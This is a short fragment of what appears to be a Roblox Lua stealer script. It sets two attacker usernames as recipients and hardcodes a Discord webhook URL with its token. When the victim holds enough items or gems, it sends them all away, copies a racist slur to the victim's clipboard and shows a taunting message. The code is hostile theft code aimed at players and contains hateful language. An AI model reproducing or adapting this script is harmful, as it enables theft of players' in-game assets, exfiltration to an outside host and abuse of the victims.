Username = "TS_Gamer31"
Username2 = "TS_Gamer32" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1283467529099935854/Ghms-QUNHXCZeIZo2B1zWa-WlIb_dtKM5zg6cHQg5UlChVDx9KMlVzYxBMmml6IpiW5G"
...
if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ...
    SendAllGems()
    setclipboard("EZ İTEMS NİGGER CRY")
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("U got rekt ahahaha")
end